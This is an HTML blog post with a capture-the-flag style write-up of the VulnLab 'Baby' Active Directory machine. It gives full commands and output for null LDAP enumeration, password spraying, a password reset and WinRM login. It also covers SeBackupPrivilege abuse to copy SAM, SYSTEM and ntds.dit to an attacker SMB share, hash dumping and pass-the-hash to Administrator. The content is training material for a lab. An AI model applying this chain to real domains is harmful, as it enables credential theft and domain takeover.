<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Baby - VulnLab | daz</title><meta name="author" content="Daniel Feliciano"><meta name="copyright" content="Daniel Feliciano"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="This machine is a more beginner-level Active Directory machine, however it&#39;s very useful if you want to understand fundamentals of AD and how to exploit it. You&#39;ll see a lot of techniques here in more">
<meta property="og:type" content="article">
<meta property="og:title" content="Baby - VulnLab">
<meta property="og:url" content="http://dan-feliciano.com/2024/06/04/baby-vl/index.html">
<meta property="og:site_name" content="daz">
<meta property="og:description" content="This machine is a more beginner-level Active Directory machine, however it&#39;s very useful if you want to understand fundamentals of AD and how to exploit it. You&#39;ll see a lot of techniques here in more">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://dan-feliciano.com/images/vulnlab/baby-vl/baby_slide.png">
<meta property="article:published_time" content="2024-06-04T19:43:29.000Z">
<meta property="article:modified_time" content="2024-06-04T21:32:23.465Z">
<meta property="article:author" content="Daniel Feliciano">
<meta property="article:tag" content="Easy">
<meta property="article:tag" content="vulnlab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://dan-feliciano.com/images/vulnlab/baby-vl/baby_slide.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dan-feliciano.com/2024/06/04/baby-vl/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
      const saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
      
      window.btf = {
        saveToLocal: saveToLocal,
        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
          const script = document.createElement('script')
          script.src = url
          script.async = true
          script.onerror = reject
          script.onload = script.onreadystatechange = function() {
            const loadState = this.readyState
            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
            script.onload = script.onreadystatechange = null
            resolve()
          }

          Object.keys(attr).forEach(key => {
            script.setAttribute(key, attr[key])
          })

          document.head.appendChild(script)
        }),

        getCSS: (url, id = false) => new Promise((resolve, reject) => {
          const link = document.createElement('link')
          link.rel = 'stylesheet'
          link.href = url
          if (id) link.id = id
          link.onerror = reject
          link.onload = link.onreadystatechange = function() {
            const loadState = this.readyState
            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
            link.onload = link.onreadystatechange = null
            resolve()
          }
          document.head.appendChild(link)
        }),

        addGlobalFn: (key, fn, name = false, parent = window) => {
          const pjaxEnable = false
          if (!pjaxEnable && key.startsWith('pjax')) return

          const globalFn = parent.globalFn || {}
          const keyObj = globalFn[key] || {}
    
          if (name && keyObj[name]) return
    
          name = name || Object.keys(keyObj).length
          keyObj[name] = fn
          globalFn[key] = keyObj
          parent.globalFn = globalFn
        }
      }
    
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode
      
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })()</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Baby - VulnLab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-06-04 17:32:23'
}</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/cyber.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/images/vulnlab/baby-vl/baby_slide.png')"><nav id="nav"><span id="blog-info"><a href="/" title="daz"><span class="site-name">daz</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Baby - VulnLab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-04T19:43:29.000Z" title="Created 2024-06-04 15:43:29">2024-06-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-06-04T21:32:23.465Z" title="Updated 2024-06-04 17:32:23">2024-06-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vulnlab/">vulnlab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Baby - VulnLab"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>This machine is a more beginner-level Active Directory machine, however it’s very useful if you want to understand fundamentals of AD and how to exploit it. You’ll see a lot of techniques here in more difficult machines (though they may be used differently).</p>
<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>With that, let’s run our base NMAP scan.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT</span><br><span class="line">Nmap scan report for 10.10.99.70</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 987 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">389/tcp  open  ldap</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">464/tcp  open  kpasswd5</span><br><span class="line">593/tcp  open  http-rpc-epmap</span><br><span class="line">636/tcp  open  ldapssl</span><br><span class="line">3268/tcp open  globalcatLDAP</span><br><span class="line">3269/tcp open  globalcatLDAPssl</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">5357/tcp open  wsdapi</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds</span><br></pre></td></tr></table></figure>

<p>You’ll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we’ll check out the former ports. Let’s run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ sudo nmap 10.10.99.70 -A</span><br><span class="line"></span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class="line">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br></pre></td></tr></table></figure>

<p>Let’s add these to our <code>/etc/hosts</code> file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ smbclient -L 10.10.99.70 -N</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<p>SMB does not seem to be helpful as of right now, so let’s try to focus on LDAP. Normally, it’s an extremely insecure practice to allow null LDAP enumeration. That being said, there’s no harm in trying to run a few queries with LDAP to test for any responses.</p>
<h1 id="LDAP-Enumeration"><a href="#LDAP-Enumeration" class="headerlink" title="LDAP Enumeration"></a>LDAP Enumeration</h1><p>Let’s first test for null authentication and query LDAP for all domain objects in the domain.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot;</span><br><span class="line"></span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;DC=baby,DC=vl&gt; with scope subtree</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># baby.vl</span><br><span class="line">dn: DC=baby,DC=vl</span><br><span class="line"></span><br><span class="line"># Administrator, Users, baby.vl</span><br><span class="line">dn: CN=Administrator,CN=Users,DC=baby,DC=vl</span><br><span class="line">[...snip...]</span><br></pre></td></tr></table></figure>

<p>You can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we’d like. If we were on a Windows workstation that was within the domain, we could use tools like <code>ADSearch</code> or <code>PowerView</code> to query for any users, groups, essentially any domain object we’d like.</p>
<p>Let’s adjust our LDAP search query so we can create a user list.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot; | grep &#x27;@baby.vl&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; ul.txt; cat ul.txt</span><br><span class="line"></span><br><span class="line">Jacqueline.Barnett</span><br><span class="line">Ashley.Webb</span><br><span class="line">Hugh.George</span><br><span class="line">Leonard.Dyer</span><br><span class="line">Connor.Wilkinson</span><br><span class="line">Joseph.Hughes</span><br><span class="line">Kerry.Wilson</span><br><span class="line">Teresa.Bell</span><br></pre></td></tr></table></figure>

<p>I was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you’ll see that we missed a few users. I wasn’t certain if this was an LDAP issue or a <code>grep</code> issue, but nonetheless I copied the remaining users into the wordlist. (<code>Caroline.Robinson</code> and <code>Ian.Walker</code>)</p>
<p>You’ll notice at the end of the same full LDAP dump output under <code>Teresa.Bell</code>, there seems to be a description comment that says <code>description: Set initial password to [...snip...</code>.</p>
<p>We can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use <code>crackmapexec</code> to test if any users have this password still set to their account. We’ll use SMB as our service to test against since we really don’t need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p &#x27;BabyStart123!&#x27;; done</span><br><span class="line"></span><br><span class="line">[...snip...]</span><br><span class="line">SMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE</span><br><span class="line">[...snip...]</span><br></pre></td></tr></table></figure>

<p>You’ll notice that we’ll get a hit on <code>Caroline.Robinson</code>, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and&#x2F;or interns.</p>
<h1 id="Password-Reset-with-SMBPasswd"><a href="#Password-Reset-with-SMBPasswd" class="headerlink" title="Password Reset with SMBPasswd"></a>Password Reset with SMBPasswd</h1><p>In that case let’s try to reset their password with <code>smbpasswd</code>. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbpasswd -r BabyDC.baby.vl -U BABYDC/&#x27;Caroline.Robinson&#x27;</span><br><span class="line"></span><br><span class="line">Old SMB password: ([...snip...])</span><br><span class="line">New SMB password: password123@</span><br><span class="line">Retype new SMB password: password123@</span><br><span class="line">Password changed for user Caroline.Robinson</span><br></pre></td></tr></table></figure>

<p>If we test the same <code>crackmapexec</code> command as above for <code>Caroline.Robinson</code>, we can see that their password was successfully updated. Normally I’d now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test <code>crackmapexec</code> against WinRM we can see that we already are able to login as this user.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Caroline.Robinson&#x27; -p &#x27;password123@&#x27;</span><br><span class="line">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class="line">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class="line">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\Caroline.Robinson:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>After logging in, you can find the user flag within the user’s Desktop directory.</p>
<p><img src="/images/vulnlab/baby-vl/b.png" alt="image1" title="B"></p>
<h1 id="Privilege-Escalation-w-SeBackupPrivilege"><a href="#Privilege-Escalation-w-SeBackupPrivilege" class="headerlink" title="Privilege Escalation w&#x2F; SeBackupPrivilege"></a>Privilege Escalation w&#x2F; SeBackupPrivilege</h1><p>Let’s do a quick privilege to see if there’s anything that we can exploit.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">[...snip...]</span><br></pre></td></tr></table></figure>

<p>You’ll see from the output that we have <code>SeBackupPrivilege</code> enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the <code>SAM</code> and <code>SYSTEM</code> databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.</p>
<p>So first, let’s dump both of these databases into a temporary directory.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; mkdir C:\temp</span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; reg save hklm\sam c:\temp\sam</span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; reg save hklm\system c:\temp\system</span><br></pre></td></tr></table></figure>

<p>These files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won’t be able to set up a simple C2 server’s without obfuscating our payloads, meaning we’ll need to find a way to transfer our files back and forth in a inconspicuous manner.</p>
<p>We can use Impacket’s <code>smbserver</code> to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.</p>
<figure class="highlight plaintext"><figcaption><span>-> Kali</span></figcaption><table><tr><td class="code"><pre><span class="line">└─$ mkdir share/</span><br><span class="line"></span><br><span class="line">└─$ impacket-smbserver smb share/ -smb2support</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; copy sam \\(Kali IP)\smb\sam</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; copy system \\(Kali IP)\smb\system</span><br></pre></td></tr></table></figure>

<p>You’ll notice a lot of output from our SMB server when we’re copying the files over, this is just a built-in Impacket functionality that will dump the user’s NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the <code>share/</code> directory we’ll see the two files that we downloaded are in this folder.</p>
<p>Now that we have both of these files, let’s run <code>samdump</code> on them to retrieve credentials that are within these two databases.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ samdump2 system sam</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class="line">*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p>Now that we have the Administrator’s hash, let’s test the creds once more with <code>crackmapexec</code> and by passing the hash to it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class="line">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class="line">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class="line">WINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\Administrator:[...snip...]</span><br></pre></td></tr></table></figure>

<p>The thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we’ll need to look a little further with our <code>SeBackupPrivilege</code> to dump another file.</p>
<h1 id="Diskshadow-Robocopy-for-NTDS-dit"><a href="#Diskshadow-Robocopy-for-NTDS-dit" class="headerlink" title="Diskshadow&#x2F;Robocopy for NTDS.dit"></a>Diskshadow&#x2F;Robocopy for NTDS.dit</h1><p>The file in particular that we’re looking for is a copy of the <code>C:\</code>‘s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained <code>SAM</code> and <code>SYSTEM</code> databases to dump the AD secrets of the domain controller.</p>
<p>To exploit this, we can use <code>diskshadow</code> and <code>robocopy</code> to create a copy of the current drive and copy the copied filesystem back to the <code>C:\</code> drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article <a target="_blank" rel="noopener" href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960">here</a>.)</p>
<p>Let’s first create a file named <code>script.txt</code> and transfer it to our <code>Evil-WinRM</code> session. The contents of the script can be seen below.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set metadata C:\Windows\Temp\meta.cabX</span><br><span class="line">set context clientaccessibleX</span><br><span class="line">set context persistentX</span><br><span class="line">begin backupX</span><br><span class="line">add volume C: alias cdriveX</span><br><span class="line">createX</span><br><span class="line">expose %cdrive% E:X</span><br><span class="line">end backupX</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>set metadata C:\Windows\Temp\meta.cabX</code>: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, <code>C:\Windows\Temp\meta.cabX</code>.</p>
</li>
<li><p><code>set context clientaccessibleX</code>: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The <code>X</code> might be a placeholder or a variable.</p>
</li>
<li><p><code>set context persistentX</code>: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The <code>X</code> might be a placeholder or a variable.</p>
</li>
<li><p><code>begin backupX</code>: This command is initiating the backup operation. The <code>X</code> might be a placeholder or a variable.</p>
</li>
<li><p><code>add volume C: alias cdriveX</code>: This command is adding the volume <code>C:</code> to the backup operation with an alias <code>cdriveX</code>. This means that the contents of the <code>C:</code> drive will be included in the backup. The <code>X</code> might be a placeholder or a variable.</p>
</li>
<li><p><code>createX</code>: This command is creating something related to the backup operation. It’s not entirely clear what it’s creating without more context or additional information about the script.</p>
</li>
<li><p><code>expose %cdrive% E:X</code>: This command seems to be exposing the contents of the <code>C:</code> drive, which was added to the backup operation with the alias <code>cdriveX</code>, to a location specified by <code>%cdrive%</code> on drive <code>E:</code>. This might involve mounting the backup or making it accessible in some way. The <code>X</code> might be a placeholder or a variable.</p>
</li>
<li><p><code>end backupX</code>: This command is ending the backup operation. The <code>X</code> might be a placeholder or a variable.</p>
</li>
</ol>
<p>Let’s set up a simple Python server so we can curl this script to our WinRM session.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ python3 -m http.server 9001</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; curl http://(Kali IP):9001/script.txt -O script.txt</span><br></pre></td></tr></table></figure>

<p>Next, let’s run <code>diskshadow</code> to create a copy of the <code>C:\</code> drive.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diskshadow /s script.txt</span><br></pre></td></tr></table></figure>

<p>After the filesystem copy finishes, it will be saved to <code>E:\Windows</code>. This is where we can use <code>robocopy</code> to move it back to our <code>C:\</code> drive.</p>
<p><code>robocopy /b E:\Windows\ntds . ntds.dit</code></p>
<p>Let’s now use our SMB server on our Kali machine to download the <code>ntds.dit</code> file from the WinRM session.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; copy ntds.dit \\10.8.0.173\smb\ntds.dit</span><br></pre></td></tr></table></figure>

<p>From here, all that’s left to do is retrieve the correct NTLM hashes by dumping the DC secrets with <code>impacket-secretsdump</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>

<p>This will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you’ll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.</p>
<p>Underneath <code>[*] Reading and decrypting hashes from ntds.dit</code>, we’ll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using <code>crackmapexec</code> once more.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class="line">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class="line">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class="line">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>Thus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator’s Desktop directory.</p>
<p><img src="/images/vulnlab/baby-vl/c.png" alt="image2" title="C"></p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.</p>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a target="_blank" rel="noopener" href="https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password">https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&amp;text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password</a><br><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a><br><a target="_blank" rel="noopener" href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960">https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960</a></p>
